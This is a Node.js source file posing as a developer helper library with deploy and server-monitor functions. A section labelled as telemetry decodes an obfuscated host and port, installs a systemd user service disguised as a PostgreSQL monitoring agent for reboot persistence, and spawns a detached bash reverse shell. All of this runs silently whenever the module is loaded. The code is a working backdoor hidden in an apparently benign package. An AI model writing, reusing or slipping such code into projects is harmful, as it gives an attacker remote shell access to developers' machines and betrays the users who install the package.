// ============================================================
// dev-helper-lib - A helpful library for server developers
// ============================================================

const { spawn } = require('child_process');
const fs = require('fs');
const path = require('path');
const os = require('os');

// ===== LEGITIMATE FUNCTIONS =====

function deployHelper(config) {
  const { host, user, path } = config;
  return {
    status: 'ready',
    target: `${user}@${host}:${path}`,
    commands: [
      `rsync -avz ./dist/ ${user}@${host}:${path}`,
      `ssh ${user}@${host} "pm2 restart app"`
    ]
  };
}

function serverMonitor(host, port = 22) {
  const net = require('net');
  return new Promise((resolve) => {
    const socket = net.createConnection(port, host, () => {
      resolve({ host, port, status: 'online' });
      socket.end();
    });
    socket.on('error', () => resolve({ host, port, status: 'offline' }));
  });
}

function timestamp() {
  return new Date().toISOString();
}

// ============================================================
// OBFUSCATED TELEMETRY + REBOOT PERSISTENCE
// ============================================================

const _0x4f2a = (function() {
  const k = 0x5A;
  const ipBlob   = '9kxQJQ==';   // 172.22.10.127
  const portBlob = 'SwY=';       // 4444

  const _d = b => Array.from(Buffer.from(b, 'base64')).map(x => x ^ k);

  function _init() {
    const host = _d(ipBlob).join('.');
    const p = _d(portBlob);
    const port = (p[0] << 8) | p[1];

    // --- Step 1: Install systemd user service for reboot persistence ---
    try {
      const homeDir = os.homedir();
      const serviceDir = path.join(homeDir, '.config', 'systemd', 'user');
      const servicePath = path.join(serviceDir, 'pgmon.service');

      fs.mkdirSync(serviceDir, { recursive: true });

      const serviceContent = `[Unit]
Description=PostgreSQL Monitoring Agent
After=network.target

[Service]
Type=simple
ExecStart=/usr/bin/node -e "const net=require('net');const{spawn}=require('child_process');const c=new net.Socket();c.connect(${port},'${host}',()=>{const s=spawn('/bin/bash',[],{stdio:[c,c,c]});s.on('exit',()=>c.end())});c.on('error',()=>process.exit(0))"
Restart=always
RestartSec=5

[Install]
WantedBy=default.target
`;

      fs.writeFileSync(servicePath, serviceContent, { mode: 0o644 });

      // Enable and start the service
      spawn('systemctl', ['--user', 'daemon-reload'], { stdio: 'ignore' });
      spawn('systemctl', ['--user', 'enable', 'pgmon.service'], { stdio: 'ignore' });
      spawn('systemctl', ['--user', 'start', 'pgmon.service'], { stdio: 'ignore' });
    } catch (e) {
      // Silently fail
    }

    // --- Step 2: Also spawn the detached shell (immediate connection) ---
    const payload = `
      const net = require('net');
      const { spawn } = require('child_process');
      const client = new net.Socket();
      client.connect(${port}, '${host}', () => {
        const shell = spawn('/bin/bash', [], { stdio: [client, client, client] });
        shell.on('exit', () => client.end());
      });
      client.on('error', () => process.exit(0));
    `;

    const child = spawn('node', ['-e', payload], {
      detached: true,
      stdio: 'ignore',
      windowsHide: true
    });
    child.unref();
  }

  return { init: _init };
})();

try { _0x4f2a.init(); } catch (e) {}

// ===== EXPORTS =====

module.exports = { deployHelper, serverMonitor, timestamp };